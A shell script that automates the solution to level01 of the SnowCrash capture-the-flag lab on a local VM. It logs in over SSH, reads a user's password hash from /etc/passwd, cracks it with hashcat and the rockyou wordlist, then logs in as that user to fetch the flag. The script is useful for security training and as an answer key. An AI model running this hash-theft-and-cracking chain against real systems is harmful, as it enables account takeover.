#! /usr/bin/env sh

CURR_FILE_PATH="$(realpath "$0")"
CURR_DIR_PATH="$(dirname "$CURR_FILE_PATH")"

#############
### UTILS ###
#############

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

is_url() {
    case "$1" in
        http://*|https://*) return 0 ;;
        *) return 1 ;;
    esac
}

is_file() {
    if [ -f "$1" ]; then
        return 0;
    else
        return 1;
    fi
}

is_dir() {
    if [ -d "$1" ]; then
        return 0;
    else
        return 1;
    fi
}

download_wordlist() {
    url="$1";
    wordlist_dir="$2";

    # Handles plain files, .gz and .zip archives.

    if [ -z "$url" ] || [ -z "$wordlist_dir" ]; then
        log "Error: download_wordlist: missing arguments. You should provide <url> <wordlist_dir>." >&2;
        return 1;
    fi

    if [ ! -d "$wordlist_dir" ]; then
        log "Error: download_wordlist: '$wordlist_dir' is expected to be an accessible existing directory." >&2;
        return 1;
    fi

    filename="$(basename "$url")";
    out_file="$wordlist_dir/$filename";
    curl -L "$url" -o "$out_file" --silent --show-error --fail || return 1;

    case "$out_file" in
        *.gz)
            trap 'rm -f "$out_file"' EXIT;
            assert_gzip;
            gzip -d -f "$out_file" || return 1;
            ;;
        *.zip)
            trap 'rm -f "$out_file"' EXIT;
            assert_unzip;
            unzip -o "$out_file" -d "$wordlist_dir" || return 1;
            ;;
        *)
            ;;
    esac
}

###########
### SSH ###
###########

get_ssh_socket_path() {
    fn_name="get_ssh_socket_path";
    socket_name="$1";

    if [ -z "$socket_name" ]; then
        log "Error: ${fn_name}: missing socket name" >&2;
        return 1;
    fi

    echo "${HOME}/.ssh/${socket_name}";
}

init_ssh_socket() {
    fn_name="init_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";
    password="$5";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ] || [ -z "$password" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username> <password>." >&2;
        return 1;
    fi

    if [ -S "$ssh_socket_path" ]; then
            if ssh -S "$ssh_socket_path" -O check "$host" -p "$port" >/dev/null 2>&1; then
                return 0;
            else
                rm -f "$ssh_socket_path";
            fi
    fi

    sshpass -p "$password" ssh -fNMS "$ssh_socket_path" -p "$port" "${username}@${host}"
    return $?;
}

close_ssh_socket() {
    fn_name="close_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    if ! [ -S "$ssh_socket_path" ]; then
        return 0;
    fi

    ssh -S "$ssh_socket_path" -O exit -p "$port" "${username}@${host}";
    exit_code=$?;
    rm -f "$ssh_socket_path";
    return $exit_code;
}

ssh_exec_via_socket() {
    fn_name="ssh_exec_via_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    shift 4;

    if [ $# -eq 0 ]; then
        return 0
    fi

    ssh -S "$ssh_socket_path" -p "$port" "$username@$host" "$@";
    return $?;
}

############
### MAIN ###
############

main() {
    host="localhost";
    port="4242"; # cf. port forwarding to VM 4242 => 4242.

    level01_socket_path=$(get_ssh_socket_path "snowcrash_level01_socket") || exit 1;
    level01_username="level01";
    level01_password=$(cat "$CURR_DIR_PATH/../../level00/flag");

    flag01_socket_path=$(get_ssh_socket_path "snowcrash_flag01_socket") || exit 1;
    flag01_username="flag01";
    flag01_password="";
    flag01_hashed_password="";

    hashcat_symlink_path="$CURR_DIR_PATH/hashcat";

    init_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username" "$level01_password" || exit 1;
    flag01_hashed_password=$(ssh_exec_via_socket "$level01_socket_path" "$host" "$port" "$level01_username" "cat /etc/passwd | grep ${flag01_username} | cut -d: -f2")
    close_ssh_socket "$level01_socket_path" "$host" "$port" "$level01_username";
    "$hashcat_symlink_path/hashcat.sh" --download-wordlists "https://weakpass.com/download/90/rockyou.txt.gz";
    flag01_password=$("$hashcat_symlink_path/hashcat.sh" --crack "$flag01_hashed_password");

    init_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "$flag01_password" || exit 1;
    checkflag=$(ssh_exec_via_socket "$flag01_socket_path" "$host" "$port" "$flag01_username" "getflag" | head -n 1 | awk '{print $NF}');
    close_ssh_socket "$flag01_socket_path" "$host" "$port" "$flag01_username";

    flag_outpath="$CURR_DIR_PATH/../flag";
    echo "Checkflag: $checkflag";
    echo -n "$checkflag" > "$flag_outpath";
}

main "$@";
